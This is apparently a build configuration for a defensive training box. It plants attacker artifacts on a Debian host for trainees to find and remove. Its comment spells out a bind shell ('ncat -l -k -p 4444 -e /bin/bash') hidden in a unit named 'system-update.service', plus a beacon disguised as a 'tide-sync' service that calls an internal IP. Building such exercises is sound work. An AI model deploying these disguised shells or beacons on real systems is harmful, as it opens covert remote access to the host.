{
  "_comment": "Opochtli Landing v2 plants (Debian 13 CLI box). The box's LEGITIMATE service stack -- harbormaster account (sudo, ~/Desktop for the huitz CLI's report/forensics files), apache2+PHP+MariaDB and the cargo-manifest web app, plus nmap's /usr/bin/ncat that the ncat-listener-autostart unit hardcodes -- is baked in during TEMPLATE PREP, not planted here. This config plants only the attacker material. Couplings that must stay in sync with boxes/opochtli-landing/scenario.yaml (asserted by tests/unit/test_boxbuilder_opochtli_landing.py): tide-sync vars <-> beacon_service_removed/beacon_process_gone/beacon_binary_removed + fq-beacon-destination; ncat-listener-autostart (catalog row: unit system-update.service, ncat -l -k -p 4444 -e /bin/bash, enable-without---now) <-> bind_shell_removed + fq-bind-shell; cockpit-installed <-> cockpit_removed. The ncat unit is enable-only, so a build loop must `systemctl start system-update.service` after plant for the bind shell to be live pre-reboot (clones start it at boot). All plants must stay ENABLED at seal: the paired checks score their absence.",
  "machines": [
    {
      "id": 1,
      "name": "opochtli-landing-01",
      "ip": "REPLACED-BY-PROVIDER",
      "user": "REPLACED-BY-PROVIDER",
      "password": "REPLACED-BY-PROVIDER",
      "os": "debian-13-cli",
      "configurations": [
        "cockpit-installed",
        "ncat-listener-autostart",
        {
          "name": "realm-beacon",
          "vars": {
            "SERVICE_NAME": "tide-sync",
            "BEACON_PATH": "/opt/tide-sync/tide-syncd",
            "DESCRIPTION": "Tide table sync service",
            "TARGET_IP": "10.233.0.66",
            "TARGET_PORT": "8443",
            "INTERVAL_S": "30",
            "BEACON_ID": "DISASTEROUS_PHARMACY"
          }
        }
      ]
    }
  ]
}
